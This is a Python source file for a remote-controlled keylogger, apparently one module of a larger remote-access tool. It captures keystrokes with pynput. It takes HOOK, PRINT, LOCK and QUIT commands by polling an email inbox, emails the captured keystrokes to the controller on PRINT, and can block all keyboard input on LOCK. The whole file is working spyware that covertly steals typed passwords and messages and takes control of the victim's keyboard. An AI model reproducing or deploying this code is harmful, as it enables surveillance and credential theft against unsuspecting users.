import json
import threading, keyboard
from urllib import response
import time
from pynput.keyboard import Listener 

class KeyloggerControl:
    def __init__(self):
        self.isLock = 0
        self.isHook = 0
        self.flag = 0
        self.container = " "
        self.msg = ""
        self.emailFrom = ""

    def Keylogger(self, key):
        if self.flag == 4:
            return False
        if self.flag == 1:
            tmp = str(key)
            if tmp == 'Key.space':
                tmp = ' '
            elif tmp == '"\'"':
                tmp = "'"
            else:
                tmp = tmp.replace("'", "")
            self.container += str(tmp)
        return

    def Print(self, emailTemplate):
        response = {
            "isSuccess": True,
            "message": self.container
        }
        emailTemplate.SendNotification(emailFrom = emailTemplate.username , emailTo = self.emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response))
        self.container = " "
        return
    
    def Listen(self):
        with Listener(on_press = self.Keylogger) as listener:
            listener.join()  
        return
    
    def Lock(self):
        if self.isLock == 0:
            for i in range(150):
                keyboard.block_key(i)
            self.isLock = 1
        else:
            for i in range(150):
                keyboard.unblock_key(i)
            self.isLock = 0
        return

    def KeyloggerHandle(self, emailTemplate, emailFrom):
        self.emailFrom = emailFrom
        self.isLock = 0
        self.isHook = 0
        self.flag = 0
        self.container = " "
        self.msg = ""
        threading.Thread(target = self.Listen).start() 

        while True:
            time.sleep(5)
            requestContent = emailTemplate.Receive()
            if not requestContent:
                continue
            jsonContent = json.loads(requestContent)
            body = jsonContent["Body"]
            bodyJson = json.loads(body)
            data = bodyJson["Data"]
            if data == 'HOOK'  :
                if self.isHook == 0:
                    self.flag = 1
                    self.isHook = 1
                else:
                    self.flag = 2
                    self.isHook = 0
            elif data == 'PRINT':
                self.Print(emailTemplate)
            elif "LOCK" == data:
                self.Lock()
            elif "QUIT" == data:
                self.flag = 4
                return    
        return 